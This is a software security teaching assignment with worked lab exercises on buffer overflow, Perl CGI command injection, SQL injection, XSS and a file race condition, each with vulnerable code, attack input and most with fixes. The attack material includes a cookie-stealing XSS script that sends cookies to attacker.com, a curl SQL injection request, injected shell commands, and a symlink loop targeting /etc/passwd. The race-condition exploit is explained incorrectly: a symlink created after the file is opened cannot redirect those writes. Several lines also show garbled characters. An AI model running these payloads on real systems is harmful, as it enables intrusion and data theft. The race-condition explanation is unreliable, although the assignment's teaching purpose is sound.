### ✅ **Practical Assignment – Chapter 11: Software Security**

---

### 📌 **Part 1: Programming-Based Practical Questions with Solutions**

---

### ✅ **Question 1: Buffer Overflow Exploit**

**Task:**  
- Write a C program with a buffer overflow vulnerability.  
- Demonstrate how to exploit it to overwrite the return address.  

**Instructions:**  
1. **Create the vulnerable program:**  
    - Accepts user input without proper bounds checking.  
2. **Compile and execute:**  
    - Compile the program with stack protection disabled.  
3. **Exploit:**  
    - Inject malicious input to trigger the overflow.  

---


**Step 1: Write the C Program**

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void vulnerable() {
    char buffer[16];
    printf("Enter input: ");
    gets(buffer);  // Vulnerable function
    printf("You entered: %s\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
```
```
**Step 2: Compile the Program**
```bash
gcc -fno-stack-protector -z execstack -o bof_exploit bof_exploit.c
```

- `gcc` — GNU C compiler.  
- `-fno-stack-protector` — disable stack canaries (no overflow checks).  
- `-z execstack` — mark the program' stack as executable (disables NX/DEP).  
- `-o bof_exploit` — name the output binary `bof_exploit`.  
- `bof_exploit.c` — source file to compile.
---

**Step 3: Create Malicious Input**
```bash
python3 -c 'print("A"*32 + "\x41\x42\x43\x44")' > input.txt
./bof_exploit < input.txt
```
- The payload overwrites the return address with `0x41424344`.  

---

### ✅ *Textbook Figure 11.2 A Web CGI Injection Attack code*

---

## (a) Rewritten Version - Unsafe Perl finger CGI Script

```perl
#!/usr/bin/perl

# finger.cgi - unsafe Finger CGI script using Perl5 CGI module

use CGI;
use CGI::Carp qw(fatalsToBrowser);
my $q = CGI->new();      # Create CGI query object

# Display HTML header
print $q->header,
      $q->start_html("Finger User"),
      $q->h1("Finger User"),
      "<pre>";

# Get username from form and execute the system finger command
my $user = $q->param("user");
print `/usr/bin/finger -sh $user`;

# Display HTML footer
print "</pre>",
      $q->end_html;
```

### Explanation of Unsafe Script

This program does the following:

1. **Reads an input field called `user`** from an HTML form.  
   Example input: `lpb`

2. **Directly inserts that input into a system command**:

```bash
/usr/bin/finger -sh lpb
```

3. Because the script uses backticks:

```perl
print `/usr/bin/finger -sh $user`;
```

Perl will **execute anything** the attacker puts after a semicolon or other shell operator â€” leading to command injection.

#### Example of an Attack Input

If an attacker enters `lpb; ls -l`, then the command executed becomes:

```bash
/usr/bin/finger -sh lpb; ls -l
```

This runs `/usr/bin/finger` and then `ls -l` on the server â€” a command injection.

---

## (b) Rewritten Version â€“ HTML Finger Form

```html
<html>
<head><title>Finger User</title></head>
<body>
<h1>Finger User</h1>

<form method="POST" action="finger.cgi">
    <b>Username to finger:</b>
    <input type="text" name="user" value="">
    <input type="submit" value="Finger User">
</form>

</body>
</html>
```

### Explanation of HTML Form

This webpage sends the `user` field to `finger.cgi` using POST. Whatever the user types becomes `$user` in the Perl script. The script does not validate input, which enables injection.

---

## (c) Rewritten Version â€“ Expected vs Subverted Outputs

### Expected Output (Normal Operation)

```
Finger User

Login   Name           TTY  Idle  Login Time   Where
lpb     Lawrie Brown   p0   Sat   15:24        ppp41.grapevine
```

### Subverted Output (Attacker Injects Command)

If attacker enters `lpb; echo attack success; ls -l` the output might show:

```
Finger User

<normal finger output>

attack success
-rwxr-x--x   1 lpb staff  537 Oct 21  16:19 finger.cgi
-rw-r--r--   1 lpb staff  251 Oct 21  16:14 finger.html
```

### Explanation of the Attack

Because `$user` is inserted directly into the backticked command, the attacker can append arbitrary shell commands and make the server execute them. This is a classic **command injection** vulnerability.

---

## (d) Rewritten Version â€“ Safe Version of Script

```perl
# Get name of user and validate
my $user = $q->param("user");

# Validate: only letters, digits, and underscore
die "The specified user contains illegal characters!"
     unless ($user =~ /^\w+$/);

# Safe to run command now
print `/usr/bin/finger -sh $user`;
```

### Explanation of Safe Script

The safety fix adds a regular expression check:

```perl
$user =~ /^\w+$/
```

This allows only letters (Aâ€“Z, aâ€“z), digits (0â€“9), and underscore (`_`). It blocks spaces, semicolons, pipes, backticks, and other shell metacharacters. If the input contains illegal characters, the script dies with an error instead of running an injection.

This simple whitelist validation prevents command injection in this context.

---

## Final Simplified Teaching Summary

| Part | Content | Key Idea |
|------|---------|----------|
| (a) | Unsafe Perl CGI script | User input is directly executed â†’ dangerous |
| (b) | HTML form | Sends unvalidated text to server |
| (c) | Attack example | Injection allows extra commands to run |
| (d) | Safe version | Input validation using regex prevents attack |

---








### ✅ **Question 2: SQL Injection Vulnerability**

**Task:**  
- Create a PHP-based web application with a SQL injection vulnerability.  
- Use SQL commands to extract unauthorized information.  

---

**Step 1: Vulnerable PHP Code**

```php
<?php
$servername = "localhost";
$username = "root";
$password = "password";
$dbname = "testdb";

$conn = new mysqli($servername, $username, $password, $dbname);

$user = $_GET['username'];
$sql = "SELECT * FROM users WHERE username='$user'";

$result = $conn->query($sql); //The database executes the injected query, leaking all user data.


if ($result->num_rows > 0) {
    while($row = $result->fetch_assoc()) {
        echo "User: " . $row["username"]. " - Password: " . $row["password"]. "<br>";
    }
} else {
    echo "0 results";
}
$conn->close();
?>
```
- The above script directly displays usernames and passwords from the database.

- If passwords are stored in plaintext, an attacker can steal them.


**Step 2: Exploit the SQL Injection**
```bash
curl "http://localhost/vuln.php?username=' OR '1'='1"
```
- This query bypasses authentication and retrieves all user data.
---

The value of `username` is directly taken from user input via `$_GET['username']`, which means it can be anything a user provides in the URL.

For example:
If a user visits:

```
http://localhost/vuln.php?username=admin
```
Then:
```
$user = $_GET['username']; 
$user = "admin";
```
But if an attacker enters:

```
http://localhost/vuln.php?username=' OR '1'='1
```
Then:
```
$user = $_GET['username']; 
$user = "' OR '1'='1";
```
Since this input is directly inserted into the SQL query:

```
$sql = "SELECT * FROM users WHERE username='$user'";
```
It results in:

```
SELECT * FROM users WHERE username='' OR '1'='1'
```
This means all users from the database will be selected, bypassing authentication.

### **Fix**
Always sanitize and validate user input using prepared statements:

```
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $user);
$stmt->execute();
```
This prevents SQL injection by treating the input as data, not SQL code.


### ✅ **Question 3: Cross-Site Scripting (XSS)**

**Task:**  
- Create an HTML form vulnerable to XSS.  
- Inject a malicious script.  

---


**Step 1: Vulnerable HTML Form**
```html
<!DOCTYPE html>
<html>
<head>
    <title>XSS Demo</title>
</head>
<body>
    <form action="xss.php" method="GET">
        Name: <input type="text" name="name">  // There is no validation or sanitization of the user inpu
        <input type="submit">
    </form>
</body>
</html>
```

**Step 2: XSS Exploit**
```html
<script>alert('Hacked!')</script>
```
- When injected in the form, it executes malicious JavaScript.  

---
### **Why is this Vulnerable?**
- The form does not sanitize or validate user input before sending it to xss.php.

- Lack of Output Encoding: If the server returns the user input as part of a webpage without encoding it properly (escaping HTML), malicious scripts can be executed in the user's browser.



### **How an Attacker Exploits This?**
- An attacker can submit the following payload into the `name` field:
```
<script>alert('Hacked!')</script>

```
If `xss.php` contains this vulnerable code:

```
<?php
echo "Hello, " . $_GET['name'];
?>
```
Then, if a user visits:

```
http://localhost/xss.php?name=<script>alert('Hacked!')</script>
```
The page will render:

```
Hello, <script>alert('Hacked!')</script>

```
And the script executes in the victim’s browser, displaying the alert "Hacked!".


# **What Can an Attacker Do?**

XSS allows attackers to: ✅ Steal Cookies:

```
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```
✅ Deface the Website:
```
<script>document.body.innerHTML = "<h1>You have been hacked!</h1>"</script>
```
✅ Redirect Users to a Malicious Site:

```
<script>window.location.href="http://phishing-site.com";</script>

```

### ** How to Fix XSS?**

✅  1. Escape User Input in Output
Use htmlspecialchars() in PHP:

```
<?php
echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?>
```
This converts <script>alert('Hacked!')</script> into safe text, preventing script execution.

✅ 2. Use Content Security Policy (CSP)
Set a CSP header to block inline scripts:
```
header("Content-Security-Policy: default-src 'self'; script-src 'none';");

```
✅ 3. Validate Input

```
$name = preg_replace("/[^a-zA-Z0-9 ]/", "", $_GET['name']);
```





### ✅ **Question 4: Race Condition Exploit**

**Task:**  
- Write a C program with a race condition vulnerability.  
- Exploit the race condition using multiple processes.

---

**Step 1: Vulnerable C Program**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    char *filename = "/tmp/race_file";
    int fd = open(filename, O_CREAT | O_RDWR, 0666);

    if (fd < 0) {
        perror("Open failed");
        exit(1);
    }

    printf("Writing to file...\n");
    write(fd, "Secure Data\n", 12);
    
    sleep(5);  // Simulate delay
    close(fd);

    return 0;
}
```
### **What the program does:**
File Opening:

- The program attempts to open a file at `/tmp/race_file` with `O_CREAT` and `O_RDWR flags`. This means if the file doesn't exist, it will be created.
- The `0666` in the `open()` function specifies the file permissions, allowing read and write access for the user, group, and others.

Writing Data:

- The program writes the string `"Secure Data\n"` to the file using the `write()` function.

Simulating Delay:

- The `sleep(5)` introduces a deliberate delay (5 seconds). During this time, the file remains open, and no further operations occur.

Closing the File:

- After the delay, the file is closed with close(fd).

### **Why this program is vulnerable:**
Race Condition: The key vulnerability here is that there is a delay `(sleep(5))` after the file is opened and before it is closed. During this time, other processes (or attackers) could potentially interfere with the file by manipulating it.

Specifically, the attack can exploit the fact that the file exists, and if the file is created with `insecure permissions`, other processes may change its contents or even replace it during this window of time.



**Step 2: Compile the Program**
```bash
gcc -o race_vuln race_vuln.c
```

**Step 3: Exploit Race Condition**
```bash
while true; do ln -sf /etc/passwd /tmp/race_file; done &
./race_vuln
```
- While the vulnerable program is still running and the file is open, it will write `"Secure Data\n"` to `/etc/passwd`, potentially corrupting sensitive files.

- Repeatedly symlink `/tmp/race_file` to `/etc/passwd`, exploiting the race condition.  

Mitigating the Race Condition:

To prevent this vulnerability, the program can:

- Avoid Delays: Eliminate unnecessary delays (like `sleep(5)`) to prevent other processes from exploiting the race condition.

- Use Secure File Handling: Instead of opening the file with `O_CREAT`, you could check if the file already exists and open it in a more controlled manner, or use `flock()` to lock the file to prevent other processes from accessing it while it is open.

- Atomic Operations: Use atomic file operations that do not leave a window of time during which the file can be manipulated by other processes.

In summary, this program is vulnerable because there is a race condition between opening and closing the file. The attacker can exploit this window to manipulate the file and cause unintended consequences.

---





